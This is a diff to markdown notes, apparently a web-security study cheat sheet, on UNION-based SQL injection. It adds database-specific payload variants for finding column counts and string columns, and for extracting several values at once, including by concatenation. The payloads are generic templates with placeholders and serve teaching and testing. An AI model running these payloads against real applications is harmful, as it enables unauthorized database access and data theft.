@@ -56,7 +56,7 @@ etc...
 	- The number of columns you find here will determine the payload structure of the rest of the steps.
 
 ```sql
-' UNION SELECT NULL--
+' UNION SELECT NULL-- -> for postgresql, microsoft
 ' UNION SELECT NULL# -> for mysql
 ' UNION SELECT NULL FROM DUAL-- -> for oracle
 
@@ -64,6 +64,7 @@ etc...'
 /*
 on oracle every select query requires FROM keyword with a valid table name
 DUAL is an oracle inbuilt table present in the database
+
 use + sign to produce spaces in HTTP/HTTPS requests.
 */
 ```
@@ -79,7 +80,7 @@ use + sign to produce spaces in HTTP/HTTPS requests.
 - Remember that there can be **more than 1 string type compatible columns** so you can try using `'b'`, `'c'`, `'d'`... to check further columns compatibility with string datatype.
 
 ```sql
-' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT 'a',NULL,NULL,NULL-- -> for postgresql, microsoft
 ' UNION SELECT 'a',NULL,NULL,NULL# -> for mysql
 ' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL--  -> for oracle
 
@@ -97,16 +98,33 @@ use + sign to produce spaces in HTTP/HTTPS requests.
 ```
 
 ### Payload Injection
-#### **PAYLOADS :**
+#### **Retrieve Multiple values from Multiple Columns**
+
+- If original query allows more than 1 column to display data the below payloads can be used.
 
 ```sql
-UNION SELECT <columns> FROM <table name>-- -> for oracle
-UNION SELECT <columns> FROM <table name># -> for mysql
+' UNION SELECT <columns> FROM <table name>-- -> for oracle, microsost, postgresql
+' UNION SELECT <columns> FROM <table name># -> for mysql
 /*
 the number of columns will vary based on what we find in the requirements phase
 the order, number of columns everything depends on the requirement phase
 so do it carefully to get better results over here.
 
+use + sign to produce spaces in HTTP/HTTPS requests.
+*/
+```
+
+#### **Retrieve Multiple values from Single Column**
+
+- If original query only allows 1 column to display data but we need values from more than 1 column we can use the below payload.
+	
+- the above payload can be used to retrieve multiple values from a single column. This technique can be useful when we need more than values from multiple columns but only 1 column value can be displayed.
+
+```sql
+' UNION SELECT <columns>||'~'||<columns> FROM <table_name>-- -> for oracle, postgresql
+' UNION SELECT <columns>+'~'+<columns> FROM <table_name>-- -> for microsoft
+' UNION SELECT CONCAT(<columns>, '~', <columns>) FROM <table_name># for mysql
+/*
 use + sign to produce spaces in HTTP/HTTPS requests.
 */
 ```
